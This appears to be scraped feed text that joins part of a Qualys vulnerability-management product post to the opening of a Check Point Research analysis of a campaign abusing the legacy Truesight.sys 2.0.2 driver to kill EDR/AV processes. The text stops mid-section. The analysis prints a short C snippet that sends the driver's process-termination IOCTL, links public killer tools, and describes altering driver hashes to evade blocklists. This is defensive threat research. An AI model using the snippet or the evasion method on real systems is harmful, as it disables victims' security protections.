&lt;p&gt;Even if your current prioritization approach relies on CVSS or Qualys severity scores, these can be used alongside the Qualys Detection Score (QDS) to refine your remediation efforts. Over 51% of CVSS vulnerabilities are rated high or critical. However, QDS provides actionable insights by identifying which of those vulnerabilities have active exploits, are being leveraged in the wild, are trending on social media, or appear on the CISA Known Exploitable Vulnerabilities list along with established remediation deadlines. You’ll also gain visibility into vulnerabilities linked to ransomware and malware campaigns, as well as the threat actors behind them.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://blog.qualys.com/qualys-insights/2022/08/08/a-deep-dive-into-vmdr-2-0-with-qualys-trurisk"&gt;A Deep Dive into VMDR with Qualys TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt;&lt;/a&gt;&lt;/p&gt;



&lt;h4 class="wp-block-heading"&gt;&lt;strong&gt;MITRE ATT&amp;amp;CK – Map Vulnerabilities to Behaviors of Attackers and Enhance Defense Strategies&lt;/strong&gt;&lt;/h4&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/hd_vm-vmdr_blog_mitre_attack.png"&gt;&lt;img alt="" class="wp-image-37297" height="1193" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/hd_vm-vmdr_blog_mitre_attack.png" width="2197" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Understanding how attackers think is key to an effective defense, which is why VMDR maps detected vulnerabilities to the MITRE ATT&amp;amp;CK framework, revealing the most critical attack vectors. This framework organizes the Tactics, Techniques, and Procedures (TTPs) commonly used by attackers during exploitation. Leveraging this approach enables organizations to prioritize the remediation of vulnerabilities based on the attack vectors employed. For instance, vulnerabilities associated with TA0001 – Initial Access represent techniques attackers use to enter a network, such as exploiting weaknesses on a public-facing web server. Remediating these vulnerabilities on internet-facing machines should be a top priority.&lt;/p&gt;

&lt;h4 class="wp-block-heading"&gt;&lt;strong&gt;Software Composition Analysis – Detect Vulnerabilities in Open-source Libraries Used in First-party Software&lt;/strong&gt;&lt;/h4&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/hd_vm-vmdr_blog_swca.png"&gt;&lt;img alt="" class="wp-image-37298" height="1118" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/hd_vm-vmdr_blog_swca.png" width="3452" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Internally developed software applications often rely on open-source components to build proprietary systems essential for business operations. However, these open-source components may contain known vulnerabilities that often go unnoticed. With Qualys Software Composition Analysis (SwCA), you can assess the risk in first-party applications, providing full visibility into the vulnerabilities within custom-built software.&lt;/p&gt;

&lt;h4 class="wp-block-heading"&gt;&lt;strong&gt;Threat Intelligence – Proactively Research and Respond to Emerging Threats with Real-Time Insights&lt;/strong&gt;&lt;/h4&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/hd_vm-vmdr_blog_threat_intel.png"&gt;&lt;img alt="" class="wp-image-37299" height="1588" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/hd_vm-vmdr_blog_threat_intel.png" width="3454" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;

&lt;h4 class="wp-block-heading"&gt;&lt;strong&gt;Detection Responses&lt;/strong&gt; &lt;strong&gt;– Proactive Alerting for Risk Items&lt;/strong&gt;&lt;/h4&gt;



&lt;p&gt;Continuous monitoring acts as a vigilant sentinel, working in tandem with VMDR to safeguard your attack surface by detecting network changes that may expose your organization to risk. You will receive real-time alerts for expired certificates, critical vulnerabilities, CVEs, etc., empowering you to take swift, proactive action via email, Slack, PagerDuty, or ServiceNow. This feature helps you stay informed of key risk items within your environment and fine-tune alert settings to prioritize high-risk issues while minimizing noise from less critical alerts.&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="attack-surface-management"&gt;Attack Surface Management&lt;/h2&gt;



&lt;p&gt;In a traditional vulnerability management program, breadth of coverage is achieved when the ratio of assets assessed for vulnerabilities matches an agreed-upon source of truth, such as an IPAM or CMDB. These assets can meet the coverage standards with an active scan from a scanner appliance or receive an agent. Qualys extends beyond these traditional approaches by offering a suite of advanced capabilities to ensure complete asset visibility across your environment. It can discover and inventory ephemeral assets that might otherwise go undetected. These methods provide continuous visibility into your attack surface, even in highly dynamic environments, ensuring that no asset goes unnoticed, whether on-premises, in the cloud, or in remote locations.&lt;/p&gt;



&lt;h4 class="wp-block-heading"&gt;&lt;strong&gt;Global AssetView&lt;/strong&gt; – &lt;strong&gt;Unified Visibility of Your Digital Assets&lt;/strong&gt;&lt;/h4&gt;



&lt;p&gt;Qualys Global AssetView provides a centralized, real-time inventory of all IT assets across on-premises, cloud, container, and remote environments, discovered through Qualys sensors and modules. By identifying and cataloging hardware, installed software, operating systems, and associated metadata, it delivers a comprehensive view of your entire digital landscape. Enhanced visibility ensures you can monitor, categorize, and secure all assets because you cannot defend what you cannot see.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://cdn2.qualys.com/docs/qualys-gav-csam-quick-start-guide.pdf"&gt;Global AssetView Quick Start Guide&lt;/a&gt;&lt;/p&gt;



&lt;h4 class="wp-block-heading"&gt;&lt;strong&gt;Certificate View&lt;/strong&gt; &lt;strong&gt;– Inventory, Assess, and Renew Certificates&lt;/strong&gt;&lt;/h4&gt;



&lt;p&gt;In one interface, you can review all the certificates discovered during the course of VMDR scanning. Each implementation is graded to evaluate whether SSL/TLS configurations certificates are supporting organizational protocols and the best encryption available.&lt;/p&gt;



&lt;p&gt;Certificates can be set up to renew or generate new certificates with compatible certificate providers such as Digicert and Let’s Encrypt!&lt;/p&gt;

&lt;h4 class="wp-block-heading"&gt;&lt;strong&gt;Cloud Agents – Monitor Security Posture in Real Time&lt;/strong&gt;&lt;/h4&gt;



&lt;p&gt;The Qualys Cloud Agent is available to both VM and VMDR customers, providing access to key features across the Qualys platform. Built with a pluggable architecture, the agent is designed for minimal impact on system performance and operates efficiently across a wide range of hardware. With unparalleled support for diverse platforms, including physical, virtual, and cloud-based assets, the Cloud Agent ensures seamless integration, offering flexibility and scalability to align with your organization’s security needs.&lt;/p&gt;



&lt;p&gt;Cloud Agents can be deployed on unlimited assets for inventory purposes at no additional cost, enabling comprehensive visibility across your environment. To activate advanced capabilities such as Vulnerability Management, Secure Configuration Assessment (SCA), or Software Composition Analysis (SwCA) scans, each asset must have the appropriate VMDR entitlements.&lt;/p&gt;



&lt;h4 class="wp-block-heading"&gt;&lt;strong&gt;Appliance Scanners – Identify Vulnerabilities on Network-Connected Devices&lt;/strong&gt;&lt;/h4&gt;



&lt;p&gt;The traditional Qualys scanner appliance is essential for identifying risk across the network. It discovers active assets, detects open ports, performs service discovery, and identifies vulnerabilities associated with those services. The active scanner plays a critical role in building a comprehensive inventory of active and potentially rogue assets while also identifying associated risks. Additionally, this appliance is used for secure configuration analysis of remote systems. It is particularly effective for network-connected assets that cannot support an agent, such as routers, firewalls, and load balancers.&lt;/p&gt;



&lt;p&gt;VMDR customers can deploy unlimited virtual scanners, providing flexible, scalable coverage tailored to their unique network segmentation and redundancy needs, ensuring comprehensive visibility across the entire environment.&lt;/p&gt;



&lt;h4 class="wp-block-heading"&gt;&lt;strong&gt;Network Passive Sensor&lt;/strong&gt; &lt;strong&gt;– Discover Transient and Unmanaged Devices&lt;/strong&gt;&lt;/h4&gt;



&lt;p&gt;After investing significant effort in building a comprehensive inventory of assets using traditional methods, Network Passive Sensors can help identify any assets that might have been missed during operational data collection. These sensors are particularly valuable in OT environments, where active inventory data collection may pose additional risks, as they provide a safe and effective means of inventorying and identifying assets. Additionally, Network Passive Sensors excel at uncovering rogue assets and shadow IT that may have been introduced outside of standard business processes.&lt;/p&gt;

&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;THREAT INTELLIGENCE REPORTS&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Check Point Research &lt;a href="https://blog.checkpoint.com/security/check-point-research-explains-shadow-pad-nailaolocker-and-its-protection/"&gt;elaborates&lt;/a&gt; about threat activity cluster that has been exploiting CVE-2024-24919, a Check Point vulnerability patched in May 2024, to deploy ShadowPad malware. In some cases, NailaoLocker ransomware was also deployed following the initial infection. The campaign, active between June 2024 and January 2025, targeted organizations across Europe, Africa, and the Americas, with the manufacturing sector being the most affected.&lt;/li&gt;
&lt;/ul&gt;
&lt;p style="padding-left: 40px;"&gt;&lt;em&gt;Check Point Harmony End Point, Threat Emulation and IPS provide protection against this threat &lt;/em&gt;&lt;em&gt;(behavioral.win.dllsideloading.s , ransomware.win.honey; RAT.Wins.ShadowPad.ta.G; Check Point VPN Information Disclosure (CVE-2024-24919)).&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/large-scale-exploitation-of-legacy-driver/"&gt;Silent Killers: Unmasking a Large-Scale Legacy Driver Exploitation Campaign&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;Highlights&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;CPR uncovered a large-scale ongoing campaign involving thousands of first-stage malicious samples used to deploy an EDR/AV killer module in its initial stage. This module was first detected and recorded in June 2024. It was observed leveraging and exploiting more than 2,500 distinct variants of the legacy version&amp;nbsp;&lt;strong&gt;2.0.2&lt;/strong&gt;&amp;nbsp;of the known vulnerable driver&amp;nbsp;&lt;strong&gt;Truesight.sys&lt;/strong&gt;, which is the RogueKiller Antirootkit Driver and part of Adlice’s product suite. This driver has a known vulnerability in versions below 3.4.0.&lt;/li&gt;



&lt;li&gt;The attackers exploited the legacy version 2.0.2 of the Truesight driver to take advantage of a Windows policy loophole (Exception in Driver Signing Policy), allowing the driver to be loaded on the latest versions of Windows OS. Notably, the attackers specifically selected the 2.0.2 version because it retains the vulnerable code while also bypassing the latest Microsoft Vulnerable Driver Blocklist and common detection mechanisms, such as those introduced by the LOLDrivers project, none of which detect this version.&lt;/li&gt;



&lt;li&gt;To further evade detection, the attackers deliberately generated multiple variants (with different hashes) of the 2.0.2 driver by modifying specific PE parts while keeping the signature valid. We detected over 2,500 validly signed variants of this driver.&lt;/li&gt;



&lt;li&gt;The attackers leveraged infrastructure in a public cloud’s China region to host payloads and operate their C2 servers. Around 75% of the victims are located in China, while the remainder come from other parts of Asia (e.g., Singapore, Taiwan).&lt;/li&gt;



&lt;li&gt;The initial-stage samples act as downloaders/loaders and often disguise themselves as well-known applications. They are typically distributed via phishing methods, including deceptive websites and phishing channels in messaging apps. Along with the EDR/AV killer module, they are designed to prepare the infected machine to deliver final-stage payloads, such as Gh0st RAT variants.&lt;/li&gt;



&lt;li&gt;CPR reported this issue to MSRC, leading to an updated version of the Microsoft Vulnerable Driver Blocklist (available since December 17, 2024), effectively preventing all variants of the legacy driver exploited in this campaign.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="introduction"&gt;Introduction&lt;/h2&gt;



&lt;p&gt;While the abuse of vulnerable drivers has been around for a while, those that can terminate arbitrary processes have drawn increasing attention in recent years. As Windows security continues to evolve, it has become more challenging for attackers to execute malicious code without being detected. As a result, the attackers often aim to disable security solutions by targeting their crucial components. These components, usually a part of security solutions for Windows OS, run as protected processes (PP/PPL) using the kernel modules of these solutions to support their functionality.&lt;/p&gt;



&lt;p&gt;Since directly terminating protected processes (PP/PPL) from user-mode using conventional methods is highly challenging, attackers turn to exploiting vulnerabilities instead. Vulnerable drivers have become a key focus, providing attackers with a pathway to bypass these protections and prepare the compromised machine for further stages of infection.&lt;/p&gt;



&lt;p&gt;A few months ago, we released our&amp;nbsp;&lt;a href="https://research.checkpoint.com/2024/breaking-boundaries-investigating-vulnerable-drivers-and-mitigating-risks/"&gt;research on vulnerable drivers&lt;/a&gt;&amp;nbsp;and shared a methodology for hunting&amp;nbsp;&lt;strong&gt;not-known-to-be-vulnerable drivers&lt;/strong&gt;. Inspired by that, we tried to adopt the attacker´s mindset and deployed specific&amp;nbsp;&lt;strong&gt;future-focused&lt;/strong&gt;&amp;nbsp;hunting rules that, instead of detecting the abuse of already known vulnerable drivers (e.g.,&amp;nbsp;&lt;a href="https://github.com/magicsword-io/LOLDrivers"&gt;LOLDrivers&lt;/a&gt;), detect the potential abuse of&amp;nbsp;&lt;strong&gt;not-known-to-be-vulnerable drivers&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;This hunting technique has a rather high false positive ratio, so we filtered these FPs away until we&amp;nbsp;&lt;strong&gt;uncovered a massive ongoing campaign&lt;/strong&gt;&amp;nbsp;involving thousands first-stage malicious samples deploying an EDR/AV killer module in its initial stage.&lt;/p&gt;



&lt;p&gt;This module was observed leveraging and exploiting more than 2,500 distinct variants of the same legacy version,&amp;nbsp;&lt;strong&gt;2.0.2&lt;/strong&gt;, of the known vulnerable driver&amp;nbsp;&lt;code&gt;Truesight.sys&lt;/code&gt;&amp;nbsp;&amp;#8211; the RogueKiller Antirootkit Driver, part of&amp;nbsp;&lt;a href="https://www.adlice.com/"&gt;Adlice’s product&lt;/a&gt;&amp;nbsp;suite.&lt;/p&gt;



&lt;p&gt;Although the Truesight driver has a known vulnerability (Arbitrary Process Termination) affecting versions below 3.4.0 (version 3.4.0 is already patched), and some of its versions (e.g., 3.3.0) are known to be abused in the wild and properly detected, the legacy version 2.0.2 flew under the radar. It was not recognized as a known-vulnerable driver by the&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules"&gt;Microsoft Vulnerable Driver Blocklist&lt;/a&gt;&amp;nbsp;or by other common detection mechanisms, such as those introduced by the LOLDrivers project.&lt;/p&gt;



&lt;p&gt;This publication takes a deep dive into this sophisticated campaign, unraveling how and why the attackers exploited the legacy Truesight driver to bypass advanced security measures. We’ll explore the techniques they used to stay undetected for months, from manipulating the driver to create thousands of variants to evading blocklists and detail the broader implications for defenders. Additionally, we’ll share how the attackers employed other advanced techniques throughout the infection chain, from persistence mechanisms and DLL side-loading to the use of commercial protectors, ultimately leading to the final payload delivery.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="background-key-findings"&gt;Background &amp;amp; Key Findings&lt;/h2&gt;



&lt;p&gt;From a research perspective, it’s always beneficial to create future-focused hunting rules. While these rules are often far from production-ready (and often feel more like Ghostbusters waiting for a ghost that might never appear), they can still lead to valuable discoveries. Such rules may help uncover new techniques or ongoing campaigns that have flown under the radar for some time. When we become aware of a new, non-public technique or methodology that hasn’t been observed in active use yet, it doesn’t mean attackers are unaware of it or won’t adopt it in the future. This is precisely the moment to start crafting future-focused rules.&lt;/p&gt;



&lt;p&gt;With this approach in mind, we focused on hunting for potential abuse of&amp;nbsp;&lt;strong&gt;not-known-to-be-vulnerable drivers&lt;/strong&gt;&amp;nbsp;and initially detected hundreds of interesting samples that led to uncovering a massive, ongoing campaign.&lt;/p&gt;



&lt;p&gt;When we began analyzing&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/9446165c038e30d89a877728d767a791b4beec6755834d7eeac5f3c418d4834c"&gt;one of the detected samples&lt;/a&gt;, at first glance we observed the malicious sample dropping a known vulnerable driver,&amp;nbsp;&lt;code&gt;Truesight.sys&lt;/code&gt;&amp;nbsp;&lt;strong&gt;&amp;#8211;&lt;/strong&gt;&amp;nbsp;the RogueKiller Anti-Rootkit Driver, which is part of&amp;nbsp;&lt;a href="https://www.adlice.com/"&gt;Adlice’s product&lt;/a&gt;&amp;nbsp;suite (notice the&amp;nbsp;&lt;strong&gt;File Version&lt;/strong&gt;&amp;nbsp;of this driver&amp;nbsp;&lt;strong&gt;2.0.2&lt;/strong&gt;&amp;nbsp;&amp;#8211; it can be easily missed).&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter is-resized"&gt;&lt;img alt="Figure 1: One of the detected samples dropping the legacy Truesight
driver, version 2.0.2." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId29.png" style="width: 840px; height: auto;" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1: One of the detected samples dropping the legacy Truesight driver, version 2.0.2.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;The Truesight driver is well known to be vulnerable and already being abused in the wild. The known vulnerability (Arbitrary Process Termination &amp;#8211; affecting versions below 3.4.0) was already utilized by a few publicly available PoCs. In fact, two highly visible GitHub repositories using this driver as an EDR/AV Killer were published over a year ago:&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;TrueSightKiller (C++)&lt;/strong&gt;:&amp;nbsp;&lt;a href="https://github.com/MaorSabag/TrueSightKiller"&gt;https://github.com/MaorSabag/TrueSightKiller&lt;/a&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Darkside (C#)&lt;/strong&gt;:&amp;nbsp;&lt;a href="https://github.com/ph4nt0mbyt3/Darkside"&gt;https://github.com/ph4nt0mbyt3/Darkside&lt;/a&gt;&lt;/p&gt;



&lt;p&gt;Both of them abuse the&amp;nbsp;&lt;strong&gt;arbitrary process termination&lt;/strong&gt;&amp;nbsp;capability of this driver just by issuing appropriate IOCTL&amp;nbsp;&lt;code&gt;0x22E044&lt;/code&gt;, where the exploit can be implemented as simply as:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;#define TERMINATE_PROCESS_IOCTL_CODE 0x22e044
// Loading the Truesight.sys driver
DWORD bytesReturned = 0;
DWORD pid = 1337; // Pid of process to be killed, PP/PPL processes possible
HANDLE hDevice = CreateFileA("\\\\.\\TrueSight", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
DeviceIoControl(hDevice, TERMINATE_PROCESS_IOCTL_CODE, &amp;amp;pid, sizeof(DWORD), NULL, 0, &amp;amp;bytesReturned, NULL);&lt;/pre&gt;



&lt;p&gt;Initially, we assumed it was just another “&lt;strong&gt;TrueSightKiller&lt;/strong&gt;” fork and overlooked the suspicious-looking version of the driver &amp;#8211; 2.0.2. What put us in the right trail was the double-checking of the TrueSightKiller repository, where we noticed that it uses the&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/bfc2ef3b404294fe2fa05a8b71c7f786b58519175b7202a69fe30f45e607ff1c"&gt;Truesight driver, version 3.3.0&lt;/a&gt;. As this version (3.3.0) of the driver was part of a list we deliberately avoided from detection by our hunting rules (already known to be vulnerable, part of the LOLDrivers project and Microsoft Vulnerable Driver Blocklist), we got back to the investigation (checking why the driver was actually detected) where we finally noticed the old version&amp;nbsp;&lt;strong&gt;2.0.2&lt;/strong&gt;&amp;nbsp;that is being used by our detected samples.&lt;/p&gt;



&lt;p&gt;At first, we quickly confirmed that the&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/347acba74fdcbeac671521739f8a34ec0e378caf716c31f55616f9f843e4d0d3"&gt;original legacy Truesight driver&lt;/a&gt;, version 2.0.2, still contains the vulnerable code allowing arbitrary process termination and that this is precisely how the detected samples were abusing the driver (EDR/AV killer module). We followed the lead and&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/search/behaviour_files%253A%2522C%253A%255C%255CWindows%255C%255CSystem32%255C%255Cdrivers%255C%255C189atohci.sys%2522?type=files"&gt;searched&lt;/a&gt;&amp;nbsp;for the system path&amp;nbsp;&lt;code&gt;C:\\Windows\\System32\\drivers\\189atohci.sys&lt;/code&gt;&amp;nbsp;where some of the detected samples dropped the driver. Below, we can see that almost 300 different samples were detected.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter is-resized"&gt;&lt;img alt="Figure 2: VT search - specific system path used by some of the
detected samples to drop the Truesight driver." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId37.png" style="width: 840px; height: auto;" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2: VT search &amp;#8211; specific system path used by some of the detected samples to drop the Truesight driver.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Just by reviewing a few of them, we quickly noticed that while they drop the&amp;nbsp;&lt;strong&gt;same version&lt;/strong&gt;&amp;nbsp;of the legacy Truesight driver, version 2.0.2, the&amp;nbsp;&lt;strong&gt;file hashes&lt;/strong&gt;&amp;nbsp;of those drivers differ (notice the same compilation timestamp).&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter is-resized"&gt;&lt;img alt="Figure 3: Comparison of different variants of the legacy Truesight
driver." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId40.png" style="width: 840px; height: auto;" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3: Comparison of different variants of the legacy Truesight driver.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;At this moment, we knew we were just one&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/search/signature%253A2.0.2%2520signature%253ATruesight%2520tag%253Anative%2520tag%253A64bits?type=files"&gt;good search&lt;/a&gt;&amp;nbsp;away from a crucial discovery. Below, we can see the detection of over 2,500 different variants (unique file hashes) linked to the same legacy Truesight driver, version 2.0.2, abused in this campaign.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 4: VT search - detecting over 2.5k variants of the legacy
Truesight driver." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId44.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4: VT search &amp;#8211; detecting over 2.5k variants of the legacy Truesight driver.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;To confirm, we&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/search/not%2520signature%253A2.0.2%2520signature%253ATruesight%2520tag%253Anative%2520tag%253A64bits?type=files"&gt;searched&lt;/a&gt;&amp;nbsp;for all Truesight drivers while excluding the legacy version 2.0.2. As expected, we found close to twenty different versions of the Truesight driver.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 5: VT search - detecting all Truesight driver versions,
excluding the legacy version 2.0.2." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId48.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5: VT search &amp;#8211; detecting all Truesight driver versions, excluding the legacy version 2.0.2.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;It appears that the attackers manipulate the Truesight driver, version 2.0.2, altering it just enough to generate different file hashes while still maintaining its valid digital signature. As a result, VirusTotal telemetry has detected over 2,500 unique variants of the same driver.&lt;/p&gt;



&lt;p&gt;Surprisingly,&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/283f5edbbe9a4a65a7e421627a23a946233fb4dc9237ab395547f2a30f3d8f08"&gt;some driver variants&lt;/a&gt;&amp;nbsp;(those with an available execution context in VirusTotal) are being used by hundreds of different initial-stage samples. This gives us an idea of the scale of this campaign, suggesting that there could be hundreds of thousands of first-stage samples, which later abuse some of the 2,500+ variants of the legacy Truesight driver, version 2.0.2. It’s important to note that these numbers are based solely on VirusTotal telemetry, meaning the actual figures are likely even higher.&lt;/p&gt;



&lt;p&gt;Huorong’s&amp;nbsp;&lt;a href="https://www.huorong.cn/document/tech/vir_report/1772"&gt;analysis&lt;/a&gt;&amp;nbsp;of a September 2024 campaign shared some similarities to our findings related to the execution chain and TTPs which were attributed to the threat actor&amp;nbsp;&lt;strong&gt;Silver Fox&lt;/strong&gt;. While there is overlap, our findings differ in several key areas. Based on the observed infection vector, execution chain, similarities in initial-stage samples to previously attributed campaigns, and historical targeting patterns,&amp;nbsp;&lt;strong&gt;CPR&lt;/strong&gt;&amp;nbsp;assesses with medium-to-high confidence that this campaign is linked to&amp;nbsp;&lt;strong&gt;Silver Fox&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;More technical details about this campaign, including how and why the attackers created these variations of the driver, as well as their step-by-step progression from the initial stage to the final payload using advanced techniques, will be covered in the technical analysis section.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="infrastructure-victimology"&gt;Infrastructure &amp;amp; Victimology&lt;/h2&gt;



&lt;p&gt;The attackers are leveraging infrastructure in a public cloud’s China region, both for hosting payloads (downloaded from buckets in the CN region &amp;#8211; see the&amp;nbsp;&lt;strong&gt;Appendix B&lt;/strong&gt;) and operating their C2 servers. Around 75% of the victims are located in China, with the remainder coming mostly from other parts of the Asia region (e.g., Singapore, Taiwan).&lt;/p&gt;



&lt;p&gt;The initial-stage samples, acting as downloaders, often disguise themselves as known applications, typically distributed via phishing methods, including deceptive websites and phishing channels in popular messaging apps.&lt;/p&gt;



&lt;p&gt;One such example of a deceptive website (&lt;code&gt;https[://]bung486[.]com&lt;/code&gt;) luring visitors with “best buy” deals on luxury goods is shown below. The domain&amp;nbsp;&lt;code&gt;bung486[.]com&lt;/code&gt;&amp;nbsp;was registered on 29 of September, 2024, while the content was captured on 6 of October, 2024.&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 6: An example of deceptive website involved in this
campaign." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId54.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6: An example of deceptive website involved in this campaign.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;When visitors click on any messaging app icon, they are redirected to a phishing channel within the corresponding messaging app.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter"&gt;&lt;img alt="Figure 7: An example of Telegram phishing channel." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId57.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7: An example of Telegram phishing channel.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;It would be a questionable coincidence that, on October 2, 2024 (the date the ITW URL was scanned), the deceptive website also hosted&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/06cb4d3d664205f10b67e011c062018dd493f568f8c842408b24fa2c551cfcb1"&gt;one of the initial-stage samples&lt;/a&gt;&amp;nbsp;involved in this campaign (&lt;code&gt;https[://]bung486[.]com/oot.setup.w06.exe&lt;/code&gt;).&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 8: One of the initial-stage samples hosted on the deceptive
website." src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId61.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8: One of the initial-stage samples hosted on the deceptive website.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;The initial infection vector, driven by phishing tactics such as deceptive websites and phishing channels, indicates that the attackers are financially motivated rather than being part of a state-sponsored group engaged in espionage. Due to the broad nature of these phishing methods, the targeted victims are likely wide-ranging, with a high probability that they include individuals or organizations across various sectors rather than being limited to specific companies or industries.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="technical-analysis-initial-stages"&gt;Technical Analysis: Initial Stages&lt;/h2&gt;



&lt;p&gt;One of the&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/338e029f6f5699584af0f315f060db4f1cda0b4289c9dd19e778f4ba27400104"&gt;earliest detected initial-stage samples&lt;/a&gt;&amp;nbsp;in this campaign, which deployed the legacy version of the Truesight driver, first appeared in mid-June 2024. This sample specifically exploited version 2.0.2 of&amp;nbsp;&lt;a href="https://www.virustotal.com/gui/file/347acba74fdcbeac671521739f8a34ec0e378caf716c31f55616f9f843e4d0d3"&gt;the&amp;nbsp;&lt;strong&gt;original&lt;/strong&gt;&amp;nbsp;legacy driver&lt;/a&gt;. As the campaign evolved, about a month later (July 2024), the initial-stage samples shifted away from using the&amp;nbsp;&lt;strong&gt;original&lt;/strong&gt;&amp;nbsp;driver and instead began exploiting thousands of its variants.&lt;/p&gt;



&lt;p&gt;The initial phase of infection involves three separate stages, summarized as follows:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Stage1&lt;/strong&gt;&amp;nbsp;&amp;#8211; downloading the&amp;nbsp;&lt;strong&gt;Stage2&lt;/strong&gt;&amp;nbsp;+ encrypted payloads for&amp;nbsp;&lt;strong&gt;Stage2&lt;/strong&gt;&amp;nbsp;(mimicking common file types, such as PNG, JPG, and GIF), and the variation of the legacy Truesight driver, version 2.0.2.&lt;/li&gt;
&lt;/ol&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31147" height="217" src="https://research.checkpoint.com/wp-content/uploads/2025/02/4IMBM6Z8BQ-rId66-1024x217.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9: Downloaded Stage2 alongside with encrypted payloads.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;ol class="wp-block-list" start="2"&gt;
&lt;li&gt;&lt;strong&gt;Stage2&lt;/strong&gt;&amp;nbsp;&amp;#8211; loading encrypted payloads, downloading&amp;nbsp;&lt;strong&gt;Stage3&lt;/strong&gt;&amp;nbsp;+ encrypted payloads for&amp;nbsp;&lt;strong&gt;Stage3&lt;/strong&gt;&amp;nbsp;(mimicking common file types, such as PNG, JPG, and GIF).&lt;/li&gt;
&lt;/ol&gt;


&lt;div class="wp-block-image"&gt;
